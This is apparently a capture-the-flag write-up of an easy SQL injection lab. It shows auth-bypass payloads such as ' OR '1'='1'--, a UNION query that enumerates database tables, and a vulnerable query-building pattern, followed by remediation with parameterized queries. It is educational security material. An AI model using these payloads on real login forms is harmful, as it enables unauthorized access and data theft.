# CTF Write-up: Basic SQL Injection Challenge

**Platform:** TryHackMe (Simulated)
**Difficulty:** Easy
**Category:** Web Exploitation
**Skills:** SQL Injection, OWASP Top 10, Burp Suite, Manual Testing

---

## 📋 Challenge Overview

**Objective:** Bypass authentication and retrieve the admin flag from a vulnerable
login form using SQL injection.

**Target:** `http://target-lab.local/login` (simulated lab environment)

---

## 🔍 Reconnaissance

### Step 1: Initial Page Review

Opening the login page in a browser, I observed a standard username/password form.
Viewing the page source revealed no client-side validation beyond empty field checks.

```html
<!-- Source snippet observed -->
<form method="POST" action="/login">
  <input type="text" name="username" />
  <input type="password" name="password" />
  <input type="submit" value="Login" />
</form>
```

**Observation:** No CSRF token, no rate limiting visible.

### Step 2: Identify Injection Point

Intercepting the login request with **Burp Suite**:

```
POST /login HTTP/1.1
Host: target-lab.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

Server responds with: `"Invalid credentials"`

---

## 💉 Exploitation

### Step 3: Test for SQL Injection

Injecting a single quote in the username field:

```
username=admin'&password=test
```

**Server response:** `500 Internal Server Error`

This confirms the input is being passed directly to a SQL query without sanitization.
The error indicates the query broke — a classic sign of SQL injection vulnerability.

### Step 4: Boolean-Based Injection

Testing a classic auth bypass payload:

```
username=admin'--&password=anything
username=' OR '1'='1'--&password=anything
```

**Payload breakdown:**
```
Original query (likely):
  SELECT * FROM users WHERE username='INPUT' AND password='INPUT2'

With injection ' OR '1'='1'--:
  SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='...'
                                         ^always true^ ^commented out^
```

**Result:** Successfully authenticated as admin. Flag retrieved: `FLAG{sqli_basics_mastered_7f3a}`

### Step 5: Enumerate Database (Bonus)

Using `UNION` injection to extract table names:

```sql
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--
```

Discovered tables: `users`, `flags`, `sessions`

---

## 🛡️ Vulnerability Analysis

| Aspect | Finding |
|:---|:---|
| **Vulnerability Type** | SQL Injection (Authentication Bypass) |
| **OWASP Classification** | A03:2021 - Injection |
| **CVSS Score (estimate)** | 9.8 Critical |
| **Root Cause** | Direct string concatenation of user input into SQL query |
| **Database Exposed** | Yes — full schema accessible |

**Vulnerable Code Pattern (Python example):**
```python
# ❌ VULNERABLE — Never do this
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

---

## 🔧 Remediation

### Fix 1: Parameterized Queries (Primary Defense)
```python
# ✅ SECURE — Parameterized query
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, hashed_password)
)
```

### Fix 2: Additional Defenses
- Use **Prepared Statements** / **ORMs** (SQLAlchemy, Django ORM)
- Implement **input validation** and allowlisting
- Apply **WAF rules** for SQLi patterns
- Enable **rate limiting** on login endpoints
- Use **bcrypt/argon2** for password hashing (never plaintext)

---

## 📚 Key Learnings

1. **Never trust user input** — all external input must be validated and sanitized.
2. **Parameterized queries** completely eliminate SQL injection for data queries.
3. **Error messages** should never reveal database details to end users.
4. **Burp Suite** is invaluable for request interception and manual testing.
5. **OWASP Top 10** remains the essential checklist for web application security.

---

## 🔗 References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- OWASP A03:2021 Injection — [owasp.org/Top10/A03_2021](https://owasp.org/Top10/A03_2021-Injection/)
